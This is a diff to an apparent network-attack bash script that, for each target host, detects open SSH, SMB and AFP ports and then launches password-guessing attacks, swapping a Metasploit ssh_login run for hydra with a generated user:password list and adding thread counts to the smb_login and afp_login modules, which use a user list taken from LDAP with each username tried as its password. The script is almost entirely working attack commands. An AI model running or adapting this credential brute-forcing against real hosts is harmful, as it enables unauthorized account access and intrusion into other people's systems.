@@ -92,8 +92,11 @@ rdp_svc=$(echo "$scan_res" | grep "3389/tcp open")
 
 
 if [[ ! -z "$ssh_svc" ]];then
-echo "===> SSH Open : Enum With MSF MODULE SSH_Login"
-msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login;set RHOSTS $line; set USER_FILE /root/ldapown/users;set USER_AS_PASS 1; exploit; exit;"
+echo "===> SSH Open : Enum With hydra ssh"
+bash create_user_password_list.sh > userpass
+hydra -C userpass -t 4 -V $line ssh
+#echo "===> SSH Open : Enum With MSF MODULE SSH_Login"
+#msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1; set THREADS 10; exploit; exit;"
 else 
 echo "===> SSH Closed"
 fi
@@ -123,7 +126,7 @@ fi
 
 if [[ ! -z "$smb_svc" ]];then
 echo "===> SMB Open : Enum With MSF MODULE SMB_Login (CTRL+C to skip)"
-msfconsole -q -x "use auxiliary/scanner/smb/smb_login;set RHOSTS $line; set USER_FILE /root/ldapown/users;set USER_AS_PASS 1; set SMBDOMAIN $url; exploit; exit;"
+msfconsole -q -x "use auxiliary/scanner/smb/smb_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1; set SMBDOMAIN $url; set THREADS 10; exploit; exit;"
 else 
 echo "===> SMB Closed"
 fi
@@ -131,7 +134,7 @@ fi
 
 if [[ ! -z "$afp_svc" ]];then
 echo "===> AFP Open : Enum With MSF MODULE AFP_Login"
-msfconsole -q -x "use auxiliary/scanner/afp/afp_login;set RHOSTS $line; set USER_FILE /root/ldapown/users;set USER_AS_PASS 1; exploit; exit;"
+msfconsole -q -x "use auxiliary/scanner/afp/afp_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1;set THREADS 10; exploit; exit;"
 else 
 echo "===> AFP Closed"
 fi
@@ -154,9 +157,10 @@ else
 echo "===> RDP Closed"
 fi
 
-echo "============= [Full Scan] ============="
-if [[ -z "$smtp_svc" && -z "$kerb_svc" && -z "$smb_svc" && -z "$afp_svc" && -z "$mssql_svc" && -z "$rdp_svc" ]]; then
-nmap $line | grep open
+
+if [[ -z "$ssh_svc" && -z "$smtp_svc" && -z "$kerb_svc" && -z "$smb_svc" && -z "$afp_svc" && -z "$mssql_svc" && -z "$rdp_svc" ]]; then
+echo "============= [Fast Scan] ============="
+nmap $line  -F| grep open
 fi
 
 else 
